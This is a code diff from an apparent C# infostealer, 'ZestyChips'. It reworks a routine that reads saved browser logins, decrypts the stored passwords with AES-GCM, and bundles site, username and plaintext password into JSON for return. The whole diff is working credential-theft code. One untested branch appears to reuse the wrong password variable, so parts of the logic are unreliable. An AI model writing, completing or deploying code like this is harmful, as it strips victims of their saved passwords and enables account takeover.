@@ -93,6 +93,8 @@ namespace ZestyChips
 
             // dictionary to store the result of each iteration of data so we can concat into 1 json object to return
             Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
+            // create a list just incase of some untested error (I dont have the chrome version to test it)
+            List<string> passwordResultsList = new List<string>();
 
             while (sdr.Read()) {
                 object obj = sdr["username_value"];
@@ -120,17 +122,51 @@ namespace ZestyChips
                 string passwordResult = "";
 
                 if (decryptedPassword != "") {
-                    passwordResult = string.Concat(new string[] {
-                        passwordResult,
-                        (obj2 != null) ? obj2.ToString() : null,
-                        " ",
-                        (obj != null) ? obj.ToString() : null,
-                        " ",
-                        decryptedPassword,
-                        " 1\r\n"
-                    });
+                    string dict_site = obj2.ToString();
+                    string dict_user = obj.ToString();
+
+                    if (masterDictionary.ContainsKey(dict_site)) {
+                        Dictionary<string, string> dictionary2 = masterDictionary;
+                        dictionary2[dict_site] = string.Concat(new string[] {
+                            dictionary2[dict_site],
+                            (dict_user != null) ? dict_user.ToString() : null,
+                            "=",
+                            decryptedPassword,
+                            "; "
+                        });
+                    } else {
+                        masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "=" + decryptedPassword + "; ");
+                    }
+
+
+                    // passwordResult = string.Concat(new string[] {
+                    //     passwordResult,
+                    //     (obj2 != null) ? obj2.ToString() : null,
+                    //     " ",
+                    //     (obj != null) ? obj.ToString() : null,
+                    //     " ",
+                    //     decryptedPassword,
+                    //     " 1\r\n"
+                    // });
                 } else if (decryptedOldStylePasswords != "") {
-                    Helpers.PrintInfo("hello 2?!");
+                    // this section is untested, so given try catch
+                    try {
+                        string dict_site = obj2.ToString();
+                        string dict_user = obj.ToString();
+
+                        if (masterDictionary.ContainsKey(dict_site)) {
+                            Dictionary<string, string> dictionary2 = masterDictionary;
+                            dictionary2[dict_site] = string.Concat(new string[] {
+                                dictionary2[dict_site],
+                                (dict_user != null) ? dict_user.ToString() : null,
+                                "=",
+                                decryptedPassword,
+                                "; "
+                            });
+                        } else {
+                            masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "=" + decryptedPassword + "; ");
+                        }
+                    } catch {
                         passwordResult = string.Concat(new string[]{
                             passwordResult,
                             (obj2 != null) ? obj2.ToString() : null,
@@ -140,13 +176,24 @@ namespace ZestyChips
                             decryptedOldStylePasswords,
                             " 2\r\n"
                         });
-                    }
-
-                Helpers.PrintInfo($"text: {passwordResult}");
+                        passwordResultsList.Add(passwordResult);
+                    }        
+                }
             }
 
+            // if we have caught any errors above and have appended to the list
+            // just return that list, it will be incomplete overall, but hopefully this 
+            // shouldnt be a problem... todo
+            // 9 times out of 10 this should never execute.
+            if(passwordResultsList.Count != 0) {
+                return JsonSerializer.Serialize(passwordResultsList);
+            }
 
-            return "";
+            // foreach (var pair in masterDictionary) {
+            //     Helpers.PrintSuccess($"Site: {pair.Key}, Value: {pair.Value}");
+            // }
+
+            return JsonSerializer.Serialize(masterDictionary);
         }
 
         private static string Aes256Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv) {
@@ -161,7 +208,7 @@ namespace ZestyChips
                     Array.Copy(encryptedBytes, 0, ciphertext, 0, encryptedBytes.Length - 16); // copy the encrypted data excluding the tag
 
                     aesGcm.Decrypt(iv, ciphertext, tag, decryptedData);
-                    
+
                     // convert decrypted data to string
                     result = Encoding.UTF8.GetString(decryptedData);
                 }
